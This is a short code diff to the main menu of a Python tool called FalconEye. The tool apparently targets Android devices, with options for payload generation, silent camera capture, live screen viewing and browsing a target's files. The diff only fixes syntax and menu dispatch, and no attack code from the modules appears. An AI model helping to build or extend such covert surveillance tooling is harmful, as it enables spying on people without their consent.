@@ -11,15 +11,17 @@ from modules import file_explorer
 
 def main():
     show_banner()
-     print("\n[1] Device Tracker (IP/Network)")
+    print("\n[1] Device Tracker (IP/Network)")
     print("[2] ADB Manager")
     print("[3] Generate Payload")
     print("[4] Silent Camera Capture")
     print("[5] Live Screen Viewer")
-    print("[6] file_operations)
+    print("[6] File Operations")
     print("[7] Session Mode Setup (ADB WiFi / QR / Manual IP)")
     print("[8] File Explorer (Target)")
     print("[9] Exit")
+
+    choice = input("\nEnter your choice: ")
 
     if choice == '1':
         ip_tracker.track_devices()
@@ -37,7 +39,7 @@ def main():
         screen_stream.start_stream()
 
     elif choice == '6':
-        app_manager.manage_apps()
+        file_operations.manage_files()
 
     elif choice == '7':
         session_mode.select_mode()
@@ -46,11 +48,11 @@ def main():
         file_explorer.browse_target()
 
     elif choice == '9':
-        print("\nExiting FalconEye... Stay Ethical ⚔️")
+        print("Exiting Falcon-Eye. Goodbye!")
         exit()
 
     else:
-        print("Invalid option. Please try again.")
+        print("Invalid choice. Please try again.")
 
 if __name__ == "__main__":
     main()
